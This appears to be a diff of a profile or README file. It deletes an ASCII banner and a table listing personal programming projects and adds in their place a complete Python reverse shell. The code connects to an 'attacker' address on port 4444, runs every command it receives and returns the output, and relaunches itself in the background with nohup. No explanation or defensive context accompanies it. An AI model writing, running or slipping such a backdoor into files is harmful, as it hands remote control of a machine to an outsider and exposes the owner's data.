@@ -17,17 +17,33 @@ echo  ╚═══════════════════════�
 
 ```diff
 
-echo VertigoFromOuterSpace
+import socket
+import subprocess
+import os
 
-echo -+------+-------------------------------------------------+--------------+
-echo  | HEX  |               PROJECT / DESCRIÇÃO               |    STACK     |
-echo -+------+-------------------------------------------------+--------------+
-echo  | 0xFF | Calculadora de Dose Máxima Anestésica           | Python       |
-echo  | 0xFF | Packet Decryption Tool (Base64/Wireshark)       | Python       |
-echo  | 0xCC | Script de Negação de Vida (Roblox - Libras)     | Lua          |
-echo  | 0xCC | Aplicativo de Tarefas Diárias                   | JavaScript   |
-echo  | 0x00 | Mod para Project Zomboid                        | Lua          |
-echo  | 0x00 | Website End-to-End                              | PHP          |
-echo  | 0x00 | [IA] Exportador VSCode → Obsidian (auto-comment)| Python + AI  |
-echo -+------+-------------------------------------------------+--------------+
+# Attacker's IP and port
+ATTACKER_IP = "192.168.1.100"
+ATTACKER_PORT = 4444
 
+def connect():
+    try:
+        # Create a socket object
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # Connect to attacker
+        s.connect((ATTACKER_IP, ATTACKER_PORT))
+        # Receive commands from attacker
+        while True:
+            command = s.recv(1024).decode()
+            if command.lower() == "exit":
+                break
+            # Execute command and send output back
+            output = subprocess.getoutput(command)
+            s.send(output.encode())
+        s.close()
+    except Exception as e:
+        print(f"Error: {e}")
+
+if __name__ == "__main__":
+    # Make the script persistent (runs in background)
+    os.system("nohup python3 -c 'import os; os.system(\"python3 " + __file__ + "\")' &")
+    connect()
